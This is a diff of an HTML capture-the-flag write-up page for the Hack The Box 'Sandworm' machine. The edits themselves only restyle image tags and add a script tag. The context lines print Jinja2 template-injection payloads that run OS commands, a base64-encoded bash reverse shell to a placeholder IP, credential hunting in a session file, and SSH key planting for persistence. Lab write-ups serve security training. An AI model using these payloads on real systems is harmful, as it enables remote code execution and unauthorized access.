@@ -507,11 +507,11 @@ uid                      </span><span class="py">{{7*7}}</span><span class="po">
 <span class="pd">└$ </span><span class="pc">echo "Test" > message.txt && gpg --clear-sign --output signed.asc message.txt</span></div>
   </div>
 
-  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-01-fdb1361efd.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-01-fdb1361efd.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Guide form with public key and signed text filled in" width="828" height="225"></picture>
-<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-02-3d84d4a527.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-02-3d84d4a527.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Public key block" width="527" height="611"></picture>
+  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-01-fdb1361efd.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-01-fdb1361efd.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Guide form with public key and signed text filled in" width="828" height="225"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-02-3d84d4a527.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-02-3d84d4a527.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Public key block" width="527" height="611"></picture>
 <p>Submit both to the <code>/guide</code> verification form. The result shows <code>49</code> as the signer identity — <strong>Jinja2 SSTI confirmed.</strong></p>
 
-  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-03-3acb10185a.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-03-3acb10185a.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Signature verification result showing 49" width="673" height="610"></picture>
+  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-03-3acb10185a.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-03-3acb10185a.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Signature verification result showing 49" width="673" height="610"></picture>
 <div class="alert alert-success">
     GOODSIG — Good signature from "<strong>49</strong>" [unknown] — <code>{{7*7}}</code> was evaluated server-side.
   </div>
@@ -533,7 +533,7 @@ uid                      </span><span class="py">{{7*7}}</span><span class="po">
 
 <span class="po">Real name: </span><span class="py">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</span>
 
-<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-04-31323a1eaf.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-04-31323a1eaf.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Signature verification showing atlas uid" width="528" height="637"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-04-31323a1eaf.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-04-31323a1eaf.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Signature verification showing atlas uid" width="528" height="637"></picture>
 <span class="pco"># Verification result:</span>
 <span class="pg">uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)</span></div>
   </div>
@@ -551,7 +551,7 @@ uid                      </span><span class="py">{{7*7}}</span><span class="po">
 <span class="pd">└$ </span><span class="pc">echo "bash -c 'bash -i >& /dev/tcp/&lt;YOUR_IP&gt;/4444 0>&1'" | base64</span>
 <span class="po">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOS80NDQ0IDA+JjEnCg==</span>
 
-<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-05-8782e8f6b4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-05-8782e8f6b4.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="cat signed_message.asc" width="667" height="386"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-05-8782e8f6b4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-05-8782e8f6b4.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="cat signed_message.asc" width="667" height="386"></picture>
 <span class="pco"># GPG key name field:</span>
 <span class="py">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAt..." | base64 -d | bash').read() }}</span>
 
@@ -579,7 +579,7 @@ bash: no job control in this shell
       <span class="term-label">atlas — hunting for creds</span>
     </div>
     <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
-<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-06-77c91bacb4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-06-77c91bacb4.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Atlas home directory listing" width="828" height="312"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-06-77c91bacb4.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-06-77c91bacb4.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Atlas home directory listing" width="828" height="312"></picture>
 <span class="pd">└$ </span><span class="pc">cat ~/.config/httpie/sessions/localhost_5000/admin.json</span>
 
 <span class="po">{
@@ -627,7 +627,7 @@ bash: no job control in this shell
 CMD: UID=1000 | </span><span class="py">/opt/tipnet/target/release/tipnet</span></div>
   </div>
 
-  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-07-69dac27abc.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-07-69dac27abc.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="/opt/tipnet directory listing" width="747" height="466"></picture>
+  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-07-69dac27abc.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-07-69dac27abc.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="/opt/tipnet directory listing" width="747" height="466"></picture>
 <h3>Writable Rust crate</h3>
   <p><code>tipnet.d</code> shows the binary imports a local logger crate. Checking its permissions:</p>
 
@@ -639,7 +639,7 @@ CMD: UID=1000 | </span><span class="py">/opt/tipnet/target/release/tipnet</span>
     <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/opt/tipnet/target/debug</span><span class="ps">]</span>
 <span class="pd">└$ </span><span class="pc">cat tipnet.d</span>
 <span class="po">/opt/crates/logger/src/lib.rs /opt/tipnet/src/main.rs</span>
-<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-08-bb128da54a.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-08-bb128da54a.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="tipnet debug folder" width="602" height="521"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-08-bb128da54a.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-08-bb128da54a.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="tipnet debug folder" width="602" height="521"></picture>
 
 <span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
 <span class="pd">└$ </span><span class="pc">ls -l /opt/crates/logger/src/lib.rs</span>
@@ -666,7 +666,7 @@ CMD: UID=1000 | </span><span class="py">/opt/tipnet/target/release/tipnet</span>
   </div>
 
   <p>Wait for the cron job to recompile tipnet. Shell fires back:</p>
-<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-09-f6d9ca8852.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-09-f6d9ca8852.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Second atlas reverse shell via tipnet" width="826" height="357"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-09-f6d9ca8852.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-09-f6d9ca8852.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Second atlas reverse shell via tipnet" width="826" height="357"></picture>
 <p>Plant an SSH key for persistence:</p>
 
   <div class="terminal">
@@ -681,7 +681,7 @@ CMD: UID=1000 | </span><span class="py">/opt/tipnet/target/release/tipnet</span>
 <span class="pd">└$ </span><span class="pc">ssh -i id_rsa atlas@ssa.htb</span>
 <span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
 <span class="pd">└$</span></div>
-<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-10-d0a84d3827.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-10-d0a84d3827.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Stable SSH session as atlas" width="817" height="221"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-10-d0a84d3827.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-10-d0a84d3827.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Stable SSH session as atlas" width="817" height="221"></picture>
   </div>
 
   <!-- ══ ROOT ══ -->
@@ -724,8 +724,8 @@ Child process initialized in 9.92 ms</span>
 <span class="py">d5be56ad************************</span></div>
   </div>
 
-  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-11-6a91a0f42f.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-11-6a91a0f42f.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="exploit.py output with session number" width="792" height="386"></picture>
-<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-12-954b359437.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-12-954b359437.png" style="width:100%;border-radius:6px;border:1px solid var(--border);margin:1rem 0;" alt="Root shell and root flag" width="860" height="431"></picture>
+  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-11-6a91a0f42f.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-11-6a91a0f42f.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="exploit.py output with session number" width="792" height="386"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-12-954b359437.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-12-954b359437.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Root shell and root flag" width="860" height="431"></picture>
 <div class="alert alert-success">🚩 Root flag captured. Machine pwned.</div>
 
   <!-- ══ SUMMARY ══ -->
@@ -768,5 +768,6 @@ Child process initialized in 9.92 ms</span>
   <span><a href="https://sp1r4.github.io/blog.html">← All posts</a></span>
 </footer>
 
+<script src="../js/writeup-sidebar.js" defer></script>
 </body>
 </html>
